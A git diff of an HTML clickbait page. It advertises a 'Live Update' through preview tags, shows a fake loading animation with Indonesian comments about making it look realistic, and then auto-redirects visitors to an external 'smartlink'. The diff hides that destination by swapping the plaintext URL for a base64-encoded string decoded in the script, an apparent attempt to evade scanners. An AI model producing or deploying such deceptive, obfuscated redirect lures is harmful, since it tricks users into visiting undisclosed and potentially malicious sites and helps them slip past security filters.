@@ -1,120 +1,104 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>Loading...</title>
+<meta charset="UTF-8">
+<title>Loading...</title>
 
-  <!-- ========== OG PREVIEW ========== -->
-  <meta property="og:title" content="🔴 Live Update Today">
-  <meta property="og:description" content="Watch the latest update happening right now ▶️ Click to view.">
-  <meta property="og:image" content="https://i.imgur.com/7fT7ulx.jpeg">
-  <meta property="og:image:width" content="1200">
-  <meta property="og:image:height" content="630">
-  <meta property="og:type" content="website">
-  <meta property="og:url" content="https://media-view.vercel.app/">
+<meta property="og:title" content="🔴 Live Update Today">
+<meta property="og:description" content="Watch the latest update happening right now ▶️ Click to view.">
+<meta property="og:image" content="https://i.imgur.com/7fT7ulx.jpeg">
+<meta property="og:type" content="website">
 
-  <style>
-    body {
-      margin: 0;
-      background: #0f0f0f;
-      color: white;
-      font-family: Arial, sans-serif;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      flex-direction: column;
-    }
+<style>
+body {
+  margin:0;
+  background:#0f0f0f;
+  color:white;
+  font-family:Arial;
+  display:flex;
+  justify-content:center;
+  align-items:center;
+  height:100vh;
+  flex-direction:column;
+}
 
-    .loader {
-      width: 50px;
-      height: 50px;
-      border: 5px solid #333;
-      border-top: 5px solid #00ffcc;
-      border-radius: 50%;
-      animation: spin 1s linear infinite;
-      margin-bottom: 25px;
-    }
+.loader {
+  width:50px;
+  height:50px;
+  border:5px solid #333;
+  border-top:5px solid #00ffcc;
+  border-radius:50%;
+  animation:spin 1s linear infinite;
+  margin-bottom:25px;
+}
 
-    @keyframes spin {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
-    }
+@keyframes spin {
+  0%{transform:rotate(0)}
+  100%{transform:rotate(360deg)}
+}
 
-    h2 {
-      margin: 0;
-      font-size: 20px;
-      margin-bottom: 10px;
-    }
+.progress-bar {
+  width:220px;
+  height:6px;
+  background:#222;
+  border-radius:10px;
+  overflow:hidden;
+}
 
-    .progress-bar {
-      width: 220px;
-      height: 6px;
-      background: #222;
-      border-radius: 10px;
-      overflow: hidden;
-      margin-top: 10px;
-    }
-
-    .progress {
-      height: 100%;
-      width: 0%;
-      background: #00ffcc;
-      transition: width 0.3s ease;
-    }
-
-    p {
-      font-size: 13px;
-      opacity: 0.6;
-      margin-top: 8px;
-    }
-  </style>
-
+.progress {
+  height:100%;
+  width:0%;
+  background:#00ffcc;
+}
+</style>
 </head>
 
 <body>
 
-  <div class="loader"></div>
+<div class="loader"></div>
+<h2 id="status">Preparing...</h2>
 
-  <h2 id="status">Preparing your content...</h2>
+<div class="progress-bar">
+  <div class="progress" id="progress"></div>
+</div>
 
-  <div class="progress-bar">
-    <div class="progress" id="progress"></div>
-  </div>
+<script>
+let p = 0;
+let bar = document.getElementById("progress");
+let txt = document.getElementById("status");
 
-  <p>Please wait a moment</p>
+// 🔒 encoded URL (base64)
+let encoded = "aHR0cHM6Ly9mZGVkZGcueGh1YnNzLm9uZS9wL25oVk55"; 
 
-  <script>
-    let progress = 0;
-    let progressBar = document.getElementById("progress");
-    let statusText = document.getElementById("status");
+function decode(u){
+  return atob(u);
+}
 
-    let interval = setInterval(() => {
-      progress += Math.random() * 15; // biar keliatan natural
-      if (progress > 100) progress = 100;
+let i = setInterval(()=>{
+  p += Math.random()*12;
+  if(p>100) p=100;
 
-      progressBar.style.width = progress + "%";
+  bar.style.width = p+"%";
 
-      // ubah teks biar lebih realistis
-      if (progress < 30) {
-        statusText.innerText = "Preparing your content...";
-      } else if (progress < 60) {
-        statusText.innerText = "Connecting to server...";
-      } else if (progress < 90) {
-        statusText.innerText = "Almost ready...";
-      } else {
-        statusText.innerText = "Launching...";
-      }
+  if(p<30){
+    txt.innerText="Preparing...";
+  } else if(p<60){
+    txt.innerText="Connecting...";
+  } else if(p<90){
+    txt.innerText="Almost ready...";
+  } else {
+    txt.innerText="Launching...";
+  }
 
-      if (progress >= 100) {
-        clearInterval(interval);
+  if(p>=100){
+    clearInterval(i);
 
-        // redirect ke smartlink
-        window.location.href = "https://fdeddg.hubss.one/p/nhVNy";
-      }
+    // redirect hasil decode
+    window.location.href = decode(encoded);
+  }
 
-    }, 300); // smooth speed
-  </script>
+}, 300);
+</script>
 
 </body>
 </html>
